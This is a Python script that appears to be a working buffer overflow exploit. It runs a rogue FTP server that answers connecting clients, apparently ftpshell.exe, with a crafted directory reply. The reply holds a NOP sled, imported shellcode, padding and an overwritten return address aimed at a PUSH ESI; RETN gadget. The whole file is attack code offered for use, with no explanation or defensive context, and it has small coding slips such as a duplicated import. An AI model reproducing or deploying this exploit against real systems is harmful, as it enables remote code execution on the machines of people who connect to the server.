#!/usr/bin/python
from time import sleep
from payload import buf
import socket
import socket



def shell_attack(target_machine, target_port):
        port = target_port
        try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind((target_machine, port))
                s.listen(5)      
        except:
                pass
        # 004b95dc in ftpshell.exe PUSH ESI ; RETN
        eip = b"\xdc\x95\x4b"
        nops = b"\x90"*8 
        junk = b"A"*(400-len(nops)-len(buf))
        buffer = nops + buf + junk + eip

        while True:
                conn, addr = s.accept()
                conn.send(b'220 Welcome to your unfriendly FTP server\r\n')              
                conn.send(b"331 OK\r\n")            
                conn.send(b'230 OK\r\n')              
                conn.send(b'220 "'+buffer+'" is current directory\r\n')